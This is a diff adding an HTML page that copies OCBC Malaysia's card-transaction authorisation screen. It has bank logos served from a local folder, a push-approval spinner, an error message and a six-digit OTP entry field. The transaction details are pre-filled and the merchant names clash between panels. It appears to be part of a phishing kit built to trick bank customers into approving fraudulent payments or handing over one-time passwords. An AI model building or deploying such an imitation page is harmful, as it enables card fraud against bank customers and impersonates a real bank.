@@ -1,0 +1,302 @@
+<div style="position: relative;">
+                
+
+
+
+    
+    
+
+    
+
+    <link type="text/css" rel="stylesheet" href="style.css">
+
+    
+<div class="vfy-spinner hidden">
+                    <div class="spin"></div>
+                    <p>Waiting for approval...</p>
+                </div>
+
+
+
+
+    
+    <div id="authDiv" class="OTonly">
+        <div>
+            <!--<div>-->
+            <table class="logoimg formactions logoimg-master" align="center">
+                <tbody><tr style="
+    background: #FFF;
+">
+                    <td width="20%"><img src="./OCBC/bankname.svg" alt="bank logo" class="borderright-master"></td>
+                    <td><img src="./OCBC/logoMasterCode.gif" alt="card brand" class="cardbrandimg-master"></td>
+                    <td align="right" width="8%"><a data-action="cancel" class="actionLink"><img class="closebtn" src="./OCBC/cancel-icon.svg"></a></td>
+                </tr>
+            </tbody></table>
+            <table align="center">
+                <tbody><tr class="header">
+                    <td>Authorise your transaction</td>
+                </tr>
+                <tr>
+                    <td>
+                        <div>
+                            <table align="center" class="innertable formactions">
+                                <!--ONETOKEN SECTION-->
+                                <tbody><tr class="whitebg">
+                                    <td colspan="2" align="center">
+                                        <div class="contenttable" id="softtokencontent">
+                                            <table id="softTokenPanel">
+                                                <tbody><tr>
+                                                    <td align="bottom">
+                                                        <div class="imgcontainer"><img src="./OCBC/pushnoti.gif">
+                                                        </div>
+                                                    </td>
+                                                    <td valign="middle">
+                                                        <div id="daf_panel" style="display:none;">
+                                                            <span><strong>Keep your transactions safe and secure.</strong> Complete the step below to verify your identity with AIRPAZ-MYR. You will not have to do so again for this merchant.</span>
+                                                        </div>
+                                                        <p>
+                                                        </p><div class="onetokencontent">
+                                                            <div><b class="biggerfont"><span>Authorise your transaction by tapping the OCBC notification we just sent.</span> </b>
+                                                            </div>
+                                                        </div>
+                                                        <!--NEW CODE: RESEND PUSH NOTIFICATION-->
+                                                        <div class="resendpush">
+                                                            <!--showing request a new push notification in 15s-->
+                                                            <div>
+                                                                <a id="resendpushlink" class="inactivemsg" data-action="resendOOB">
+                                                                    <div id="resendpushnotfdiv" style="display:none;"><span id="resendpushnotf">Resend a new notification in</span> <span id="seconds">11<span>s</span></span></div>
+                                                                </a>
+                                                                <!-- <div id="seconds"></div> -->
+                                                            </div>
+                                                        </div>
+                                                        <p></p>
+
+                                                    </td>
+                                                </tr>
+                                                <tr>
+                                                    <td colspan="2">
+                                                        <table class="trxinfotable onetokeninfo">
+                                                            <tbody><tr>
+                                                                <td>Amount:</td>
+                                                                <td><span>234.81</span>
+                                                                </td>
+                                                            </tr>
+                                                            <tr>
+                                                                <td>Merchant:</td>
+                                                                <td>REDBUS</td>
+                                                            </tr>
+                                                            <tr>
+                                                                <td>Card Number:</td>
+                                                                <td><span></span>
+                                                                    •• <span>1703</span></td>
+                                                            </tr>
+                                                            <tr>
+                                                                <td>Time:</td>
+                                                                <td><span>23/05/2026, 9:34PM</span><span>
+                                                                        MYT</span></td>
+                                                            </tr>
+                                                        </tbody></table>
+                                                    </td>
+                                                </tr>
+
+                                                <tr>
+                                                    <td colspan="2">
+                                                        <!--NOTE: HIDE CLASS=HEIGHT16 WHEN LINK IS ACTIVE-->
+                                                        
+                
+                                                        <p id="offlineTokenLink" style="display: none;"></p>
+                                                        <!--<p id="offlineTokenLink"><span data-th-utext="${pushIssue}"></span> <span class="activelink" ><a data-action="offlineSoftToken" class="actionLink"><span data-th-utext="${useOffline}"></span></a></span></p>-->
+
+                                                        <p class="maxmsg maxmsgwide"><strong>No notification received?</strong> Open the OCBC
+                                                            Malaysia Mobile Banking app and tap on OneToken to authorise manually.
+                                                        </p><div style="
+    text-align: center;
+">
+
+
+<style>.hidden{display: none!important;}</style>
+                <div class="app-error hidden" style="
+    color: red;
+">APP verification not completed. Please try again.</div>
+
+
+
+
+<div id="formactions" style="
+    color: #ec1121 !important;
+    text-decoration: none;
+    cursor: pointer;
+    padding: 8px 8px;
+    margin: 4px 2px;
+    background: #FFFFFF;
+    border-radius: 5px;
+    text-align: center;
+    font-weight: bold;
+    border: 1px solid #ec1121;
+    display: inline-block;
+    cursor: pointer;
+    font-weight: bold;
+    font-size: 12px;
+">
+                    
+                    
+                    <a data-action="resend"><div class="resendbtn">Continue to complete</div></a>
+                </div></div>
+                                                    </td>
+                                                </tr>
+                                            </tbody></table>
+                                        </div>
+                                    </td>
+                                </tr>
+                                <!--OFFLINE ONETOKEN SECTION-->
+                                <tr class="whitebg">
+                                    <td colspan="2" align="center">
+                                        <div class="contenttable" id="offlinesofttokencontent">
+                                            <table id="offlinesoftTokenPanel">
+                                                <tbody><tr>
+                                                    <td valign="middle" colspan="2">
+                                                        <div id="daf_panel_offline" style="display:none;">
+                                                            <span><strong>Keep your transactions safe and secure.</strong> Complete the step below to verify your identity with AIRPAZ-MYR. You will not have to do so again for this merchant.</span>
+                                                        </div>
+                                                        <p>
+                                                        </p><div class="onetokencontent offlinecontent">
+                                                            <div><b class="biggerfont">Enter 6-digit One Time Password (OTP)</b></div>
+                                                            <span class="nospace" style="font-weight: 600 !important;">To generate a manual OTP, launch the OCBC Malaysia Mobile Banking app &gt; OneToken &gt; "One Time Password". Authorise in </span>
+                                                        </div>
+                                                        <div class="offlineimg" align="center"><img src="./OCBC/offline_softtoken.png">
+                                                        </div>
+                                                        <p></p>
+                                                    </td>
+                                                </tr>
+                                                <tr>
+                                                    <td colspan="2">
+                                                        <table class="trxinfotable onetokeninfo">
+                                                            <tbody><tr>
+                                                                <td>Amount:</td>
+                                                                <td><span>234.81</span>
+                                                                    <span>MYR</span>
+                                                                </td>
+                                                            </tr>
+                                                            <tr>
+                                                                <td>Merchant:</td>
+                                                                <td>AIRPAZ-MYR</td>
+                                                            </tr>
+                                                            <tr>
+                                                                <td>Card Number:</td>
+                                                                <td><span></span>
+                                                                    •• <span>1703</span></td>
+                                                            </tr>
+                                                            <tr>
+                                                                <td>Time:</td>
+                                                                <td><span>23/05/2026, 9:34PM</span><span>
+                                                                        MYT</span></td>
+                                                            </tr>
+                                                        </tbody></table>
+                                                    </td>
+                                                </tr>
+                                                <tr>
+                                                    <td colspan="2">
+                                                        <table>
+                                                            <tbody><tr>
+                                                                <td align="center">
+                                                                    <div class="input-wrap">
+                                                                        <table class="inputlines" for="oneTimePin">
+                                                                            <tbody><tr>
+                                                                                <td></td>
+                                                                                <td></td>
+                                                                                <td></td>
+                                                                                <td></td>
+                                                                                <td></td>
+                                                                                <td></td>
+                                                                            </tr>
+                                                                        </tbody></table>
+                                                                        <input type="tel" name="oneTimePin" id="oneTimePin" maxlength="6" value="" class="otpinput input oneTimePin" inputmode="numeric">
+                                                                    </div>
+                                                                </td>
+                                                            </tr>
+                                                        </tbody></table>
+                                                    </td>
+                                                </tr>
+                                            </tbody></table>
+                                        </div>
+                                    </td>
+                                </tr>
+                                <!--SMS OTP SECTION-->
+
+                        
+                        </tbody></table>
+                    </div></td>
+                </tr>
+            </tbody></table>
+
+        </div>
+
+        
+        
+
+        
+        
+        
+
+        
+        
+
+        
+        
+
+        
+        
+
+        
+        
+
+        
+        
+
+    </div>
+
+    
+
+
+    
+
+
+    
+
+        
+
+
+
+
+        
+
+        
+
+        
+
+
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+
+    
+
+    
+
+
+
+
+
+            </div>
